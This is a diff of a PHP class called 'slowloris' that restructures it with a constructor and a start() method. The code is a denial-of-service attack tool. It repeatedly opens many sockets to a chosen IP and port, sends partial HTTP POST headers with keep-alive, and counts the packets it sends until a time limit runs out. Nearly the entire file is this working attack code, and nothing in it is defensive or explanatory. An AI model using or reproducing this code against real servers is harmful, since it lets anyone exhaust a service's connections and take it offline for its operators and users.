@@ -1,33 +1,41 @@
 <?php
+include_once "../header.php";
 class slowloris{
-	
-	
-	function slowloris($ip, $port, $timedout, $starttime, $socketn, $max_time, $exec_time){						//SLOWLORIS
+	public $ip;
+	public $port;
+	public $timedout;
+	public $socketn;
+	public $max_time;
+	public function __construct($ip, $port, $timedout, $socketn, $max_time) {
+		$this->ip = $ip;
+		$this->port = $port;
+		$this->timedout = $timedout;
+		$this->socketn = $socketn;
+		$this->max_time = $max_time;
+
+	}
+	function start(){						//SLOWLORIS
 		$lenght=42;
+		$packet=0;
 			while(1){
-				try{ 
-					if(time() > $max_time){
-						output($packets, $starttime, $exec_time, $lenght);
-						break; 
-					}
+				if(time() >= $this->max_time){
+					return $packet;
+					break; 
+				}
 				
-					for($i=0;$i<=$socketn;$i++){
-						$fp[$i]=fsockopen("$ip",$port,$errno,$errstr,$timedout);
-						$out="POST / HTTP/1.1\r\n";
-						$out.="Host: ".$ip."\r\n";
-						$out.='Content-Type: application/x-www-form-urlencoded\r\n';
-						$out.="Content-length: ".$lenght."\r\n";
-						$out.= "Connection: keep-alive\r\n";
-						$out.= "\r\n";
-						$packets++; 
-						fwrite($fp[$i],$out);
+				for($i=0;$i<=$this->socketn;$i++){
+					$fp[$i]=fsockopen($this->ip,$this->port,$errno,$errstr,$this->timedout);
+					$out="POST / HTTP/1.1\r\n";
+					$out.="Host: ".$this->ip."\r\n";
+					$out.='Content-Type: application/x-www-form-urlencoded\r\n';
+					$out.="Content-length: ".$lenght."\r\n";
+					$out.= "Connection: keep-alive\r\n";
+					$out.= "\r\n";
+					$packet++; 
+					fwrite($fp[$i],$out);
 				}
-				for($j=0;$j<=$socketn;$j++){
-					
+				for($j=0;$j<=$this->socketn;$j++){
 					fclose($fp[$j]);
-				}
-				}catch (Exception $e){
-				echo $e;
 				}
 			}
 
